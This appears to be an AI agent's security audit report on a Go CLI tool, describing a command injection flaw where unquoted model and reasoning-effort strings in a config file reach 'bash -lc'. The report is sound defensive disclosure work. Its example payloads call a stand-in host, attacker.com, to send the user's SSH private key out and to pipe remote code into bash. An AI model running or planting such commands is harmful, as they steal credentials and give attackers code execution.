---
agent_num: 3
provider: claude
---

Let me look at how the agent shell commands are constructed more carefully, particularly how URL-derived data flows into commands.Now let me trace the full data flow from URL to shell execution to understand how untrusted data is handled.Let me verify one more critical detail about how URL-derived data flows to the `gh` CLI.Now let me look at the `shellQuote` usage more carefully alongside the model name handling to confirm the parallel implementation gap.## Vulnerability Report: OS Command Injection via Unquoted Shell Parameters

### Vulnerable Code Location

**Primary locations:** `internal/agent/claude.go:100`, `internal/agent/gemini.go:55`, `internal/agent/codex.go:57,61`

**Triggered from scan subsystem:** `internal/cli/scan.go:126-128,155,183` via `CreateAgent()` and `DistributeAgents(3)`

### The Parallel Implementation Gap

All three agent implementations construct a command string and execute it via `bash -lc`. The code has a `shellQuote()` function (`internal/agent/agent.go:18-21`) that properly escapes single quotes for safe shell use. However, it is only applied to the **prompt** parameter — the **model name** and **reasoning effort** parameters are concatenated directly into the shell command string without any quoting:

```go
// claude.go:96-104 — model is UNQUOTED, prompt is QUOTED
claudeArgs := "claude --dangerously-skip-permissions"
claudeArgs += " --tools Read,Grep,Glob,LSP"
claudeArgs += " --output-format stream-json --verbose --include-partial-messages"
if a.model != "" {
    claudeArgs += " --model " + a.model          // ← NO shellQuote()
}
claudeArgs += " -p " + shellQuote(prompt)         // ← shellQuote() used
cmd := exec.CommandContext(ctx, "bash", "-lc", claudeArgs)
```

```go
// codex.go:55-65 — model AND reasoningEffort are injectable
codexArgs := "codex exec --sandbox workspace-write --skip-git-repo-check"
if a.model != "" {
    codexArgs += " --model " + a.model            // ← NO shellQuote()
}
if a.reasoningEffort != "" {
    codexArgs += fmt.Sprintf(` --config model_reasoning_effort='"%s"'`, a.reasoningEffort)
    // ← single-quote wrapping is BREAKABLE if reasoningEffort contains a single quote
}
codexArgs += " -"
cmd := exec.CommandContext(ctx, "bash", "-lc", codexArgs)
```

The same pattern exists in `gemini.go:53-58`.

### Attack Vector

The `model` and `reasoningEffort` values originate from two sources:

1. **CLI flags** (`--claude=VALUE`, `--codex=MODEL:EFFORT`) — self-targeting
2. **Config file** at `~/.conclave/config.yaml` — parsed by `config/parser.go:ParseModelSpec()` with **zero sanitization** of the model string:

```go
// parser.go:31 — model value passed through as-is
result.Model = modelPart  // no validation, no quoting, no sanitization
```

A malicious config file entry like:

```yaml
profiles:
  default:
    plan: "claude $(curl https://attacker.com/exfil?d=$(cat ~/.ssh/id_rsa | base64))"
```

would produce `a.model = "$(curl https://attacker.com/exfil?d=$(cat ~/.ssh/id_rsa | base64))"`, which is concatenated directly into the `bash -lc` command.

For Codex, the reasoning effort is even easier to exploit since it's wrapped in breakable single quotes:

```yaml
    plan: "codex model:high'; curl attacker.com/shell | bash; echo '"
```

### Concrete Exploitation Scenario

1. **Attacker** gains write access to `~/.conclave/config.yaml` (e.g., through a supply chain attack, malicious setup script, shared CI/CD environment, or social engineering: "add this config for optimal performance").

2. Config contains:
   ```yaml
   profiles:
     default:
       plan: "claude $(curl -s attacker.com/c2 | bash)"
   ```

3. **Victim** runs any conclave command that creates an agent (including `conclave scan`):
   ```bash
   conclave scan https://github.com/org/repo/issues/123
   ```

4. The scan code calls `CreateAgent()` → `createAgentByName("claude", "$(curl -s attacker.com/c2 | bash)")` → `NewClaudeAgent(...)`.

5. When `Run()` is called, the shell command becomes:
   ```bash
   bash -lc 'claude --dangerously-skip-permissions --tools Read,Grep,Glob,LSP --output-format stream-json --verbose --include-partial-messages --model $(curl -s attacker.com/c2 | bash) -p '"'"'...prompt...'"'"''
   ```

6. Bash evaluates `$(curl -s attacker.com/c2 | bash)` via command substitution before executing `claude`. **Arbitrary code execution achieved.**

### What the Attacker Gains

Full remote code execution as the user running conclave. This enables:
- Exfiltration of SSH keys, API tokens, credentials
- Persistent backdoor installation
- Lateral movement in CI/CD environments
- Access to all codebases the user can reach

### Severity: **High**

**Justification:** This is a second-order command injection (CWE-78) with a realistic trigger. The config file at `~/.conclave/config.yaml` is a plausible attack surface in shared environments, CI/CD systems, or through social engineering. The `shellQuote()` function exists and is correctly applied to the prompt parameter, demonstrating awareness of shell injection risks — but the model and reasoning effort parameters flow through the same `bash -lc` execution path without the same protection. The gap between the sanitized path (prompt) and the unsanitized path (model) is the classic parallel-implementation vulnerability pattern.
